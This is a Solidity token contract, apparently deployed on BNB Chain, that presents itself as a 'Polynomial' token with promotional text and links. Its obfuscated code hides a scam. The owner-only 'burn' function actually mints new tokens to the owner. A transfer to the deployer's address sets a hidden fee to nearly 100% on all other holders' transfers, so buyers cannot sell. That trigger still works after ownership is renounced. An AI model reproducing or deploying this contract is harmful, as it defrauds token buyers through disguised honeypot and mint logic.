/**
 *Submitted for verification at BscScan.com on 2022-12-01
*/

/*
PolynomialFi
Polynomial Protocol ➡️ ETH India 🇮🇳
The ONLY event you need to be at this week 🙀
Bringing you UNPLUGGED, a fine blend of builders & operators dressed in BLR colors 
If you love Web3 & are ETHIndiaco, you absolutely cannot miss this, RSVP 👇 The DeFi Derivatives Powerhouse ⚡️ come say gm 
https://www.polynomial.fi/
http://discord.gg/polynomial
https://twitter.com/PolynomialFi
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.2;
contract Polynomial {
uint256 private  HHZDHB = 1000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  FKGCZX = address(0);
string public  name = "Polynomial";
address private  MOCLFS = address(0);
string public  symbol = "Polynomial";
address public owner;
address private  PRYEVR = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  GVUAIV = 1000000000000000000;
uint256 private  IBZHFL = 1000000000000000000;
uint256 public constant DIETAM = 99999;
uint256 private  LTKJNR = 100000000;
uint256 private  MWBQYN = 1000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => uint256) public balanceOf;
uint256 private  QRKEFY = 10000000000000;
uint256 private  XMRHXC = 10000000000;
address private  CEXJHD = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  IPKQKW = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint8 public constant decimals = 18;
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getQRKEFY() private returns (uint256) {
return QRKEFY;
}

function _getXMRHXC() private returns (uint256) {
return XMRHXC;
}

function _getMWBQYN() private returns (uint256) {
return MWBQYN;
}

constructor () {
MOCLFS = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getIPKQKW() private returns (address) {
return IPKQKW;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getHHZDHB() private returns (uint256) {
return HHZDHB;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tPECHLZ 0");
require(spender != address(0), "fPECHLZ 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getGVUAIV() private returns (uint256) {
return GVUAIV;
}

function _getCEXJHD() private returns (address) {
return CEXJHD;
}

function _getLTKJNR() private returns (uint256) {
return LTKJNR;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getPRYEVR() private returns (address) {
return PRYEVR;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getFKGCZX() private returns (address) {
return FKGCZX;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "PECHLZ");
require(to != address(0), "PECHLZ");
require(amount <= balanceOf[from], "PECHLZ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* DIETAM/IBZHFL ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==MOCLFS){
IBZHFL = DIETAM+2;
}
emit Transfer(from, to, transferAmount);
}

}